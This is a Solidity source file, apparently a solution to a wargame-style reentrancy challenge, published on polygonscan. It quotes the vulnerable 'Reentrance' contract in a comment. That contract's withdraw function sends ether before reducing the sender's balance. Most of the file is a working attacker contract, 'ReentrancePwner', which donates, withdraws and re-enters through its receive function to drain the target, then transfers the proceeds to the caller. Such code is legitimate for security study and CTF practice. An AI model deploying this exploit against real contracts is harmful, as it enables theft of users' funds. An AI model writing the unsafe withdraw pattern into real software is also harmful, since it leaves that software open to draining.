/**
 *Submitted for verification at polygonscan.com on 2023-04-06
*/

/*

pragma solidity ^0.6.12;

import 'openzeppelin-contracts-06/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

*/
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

 interface IReentrance {

  function donate(address _to) external payable;
  
  function balanceOf(address _who) external view returns (uint balance);
 

  function withdraw(uint _amount) external;

  receive() external payable;

}

contract ReentrancePwner {
    bool public done;
    address immutable deployer;
    IReentrance immutable addr;
    uint256 immutable value;

    constructor(IReentrance _addr) payable {
      addr = _addr;
      deployer= msg.sender;
      value = msg.value;
         require(msg.value==address(addr).balance,"must send enough eth");
      addr.donate{value: msg.value}(address(this));
    }

    function pwn() external{
      addr.withdraw(value);

      payable(msg.sender).transfer(address(this).balance);

    }

    receive() external payable{
      if(!done)
      { 
        done=true;
        addr.withdraw(addr.balanceOf(address(this)));
      }

    }

}